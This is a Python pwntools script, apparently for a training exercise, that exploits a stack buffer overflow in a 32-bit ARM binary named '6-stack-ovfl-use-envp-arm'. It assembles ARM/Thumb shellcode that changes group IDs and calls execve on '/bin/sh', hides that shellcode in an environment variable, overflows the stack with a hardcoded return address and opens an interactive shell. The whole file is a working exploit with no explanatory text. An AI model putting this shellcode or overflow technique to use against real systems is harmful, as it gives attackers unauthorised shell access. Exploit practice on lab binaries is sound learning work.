#!/usr/bin/env python3

import os
import subprocess

from pwn import *
from pwn import asm, context, gdb, p8, p32, process

context.arch = "arm"
context.bits = "32"
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"

# run this embedded shellcode
shellcode = asm(
    """
.code 32
add r3,pc,#1
bx r3
.code 16
movs r7,0x32
svc #1
mov r1,r0
movs r7,0x47
mov r1,r1
svc #1
adr r0,binsh
eor r1,r1
eor r1,r1
sub r1,r1
sub r2,r2
strb r2,[r0,#7]
movs r7,0x0b
svc #0x1
binsh: .ascii "/bin/shX"
""",
    arch="arm",
)
shellcode += b"a" * 3

with open("shellcode.bin", "wb") as f:
    f.write(shellcode)

var_name = "SHELLCODE"
env = {var_name: shellcode}
io = process("./6-stack-ovfl-use-envp-arm", env=env)
# result = subprocess.run(["./env32", var_name], stdout=subprocess.PIPE)
# shellcode_addr = int(result.stdout.strip(), base=16)
shellcode_addr = 0xFFFEF426
# jump_addr = p32(shellcode_addr + len(var_name) + 1)
jump_addr = p32(0xFFFEFFA4)
payload = asm("nop") * 2 + jump_addr
with open("stdin.bin", "wb") as f:
    f.write(payload)
# print(result.stdout.strip(), "<- var_embeded here")
print(f"{payload=}")
print(f"{len(jump_addr)} <- jump_addr length")
print(f"{len(payload)} <- payload length")
print(f"{len(shellcode)} <- shellcode length")
print(f"{jump_addr} <- jump_addr")

print(io.recv())
io.sendline(payload)
print(io.recv())
io.interactive()
